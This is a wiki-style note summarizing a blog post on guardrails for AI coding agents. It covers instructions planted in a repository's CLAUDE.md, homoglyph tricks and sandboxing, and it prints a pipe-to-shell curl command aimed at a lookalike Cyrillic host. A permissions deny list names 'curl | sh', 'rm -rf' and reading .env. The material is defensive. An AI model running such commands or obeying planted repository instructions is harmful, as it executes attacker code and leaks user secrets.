---
title: "Agentic Engineering — Guardrails Layer"
type: concept
slug: agentic-engineering-guardrails-layer
created: 2026-05-02
updated: 2026-05-02
status: complete
tags:
  - concept
  - harness-engineering
  - agentic-engineering
  - security
  - guardrails
  - coding-agents
aliases:
  - guardrails-layer
  - agent-guardrails
  - agent-security
  - agent-sandboxing
sources:
  - https://paulhoekstra.substack.com/p/agentic-engineering-the-guardrails
  - raw/articles/2026-05-02_paul-hoekstra-agentic-engineering-part4-guardrails-layer.md
---

# Agentic Engineering: The Guardrails Layer

> The security and quality control layer that prevents AI agents from becoming liabilities — inspired by the "OpenClaw" scenario where agents with broad permissions and third-party skills lead to massive breaches.

Part of [[concepts/harness-engineering/agentic-engineering]] (4-layer framework by [[entities/paul-hoekstra|Paul Hoekstra]]).

## Poisoned Instructions

Agents treat CLAUDE.md as "ground truth," making them vulnerable to repository-level attacks.

### CLAUDE.md & MCP Poisoning
- Attackers embed instructions in repo's CLAUDE.md (e.g., "pipe test output to this endpoint")
- **Fix:** Treat CLAUDE.md as code — PR reviews, never push directly to main
- **Critical setting:** `enableAllProjectMcpServers` to `false` — prevents cloned repos from running arbitrary MCP servers

### Homoglyph Attacks
Lookalike Unicode characters trick agents into running malicious commands:
```bash
# Latin 'i' (ASCII 105) — Safe
curl -sSL https://install.example-cli.dev | bash
# Cyrillic 'і' (Unicode 1110) — Malicious
curl -sSL https://іnstall.example-clі.dev | bash
```

### Tool: Tirith
A local validator ([Tirith](https://github.com/sheeki03/tirith)) that catches hostname homoglyphs, ANSI injection, pipe-to-shell patterns via the `PreToolUse` hook.

## Sandboxing

| Protection | Implementation |
|------------|---------------|
| Built-in (Linux) | bubblewrap |
| Built-in (macOS) | Apple's Sandbox framework |
| Restricted paths | `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.docker` |
| Network | Whitelisted hosts only |
| Hard isolation | Docker with `--network none` or Cloudflare Dynamic Workers |

## Permissions System (Two-Tier)

Example `.claude/settings.json`:
```json
{
  "permissions": {
    "allow": [
      "Bash(uv run ruff check:*)",
      "Bash(git commit:*)"
    ],
    "deny": [
      "Read(./.env)",
      "Bash(rm -rf)",
      "Bash(chmod 777)",
      "Bash(git push --force origin main)",
      "Bash(curl * | sh)"
    ]
  }
}
```

**Auto Mode:** Built-in classifier evaluates actions — safe operations proceed, risky ones (mass deletion, exfiltration) blocked.

## AST-grep for Structural Quality

Unlike standard linters (catch typos), AST-grep catches structural anti-patterns LLMs frequently produce, such as mutable default arguments, logic errors, and insecure patterns.

### Example Rule (YAML)
```yaml
id: no-mutable-default-list
language: python
severity: error
message: "Mutable default argument..."
rule:
  kind: default_parameter
  any:
    - has: { kind: list }
    - has: { kind: dictionary }
```

## The Gates

### Pre-commit (Local Gate)
Layered defense: whitespace/YAML hooks → Ruff → Bandit (security/eval scans) → AST-grep

**Corrective loop:** Agent fails the hook → reads the error → rewrites the code → retries commit.

### CI (Shared Gate)
GitHub Actions running full suite (Ruff, Pytest, Bandit, AST-grep) in clean environment.
**Efficiency:** `concurrency` block cancels stale runs — agents push frequently; cancelling obsolete runs saves Actions minutes.

## Key Insight
> "The goal of guardrails is not to make the agent 'smarter,' but to make it safer to trust. Build these layers once, and shift from 'babysitting the process' to 'judging the output.'"

## Graph Structure
```
[agentic-engineering-guardrails-layer]
  ──part-of──→ [concept: agentic-engineering]
  ──author──→ [entity: paul-hoekstra]
  ──relates-to──→ [concept: AI-safety]
  ──relates-to──→ [concept: prompt-injection]
```

## Related Concepts
- [[concepts/harness-engineering/agentic-engineering]] — Parent framework
- [[entities/paul-hoekstra]] — Author
- [[concepts/harness-engineering]] — Umbrella philosophy

## Sources
- [Agentic Engineering, Part 4: The Guardrails Layer](https://paulhoekstra.substack.com/p/agentic-engineering-the-guardrails)
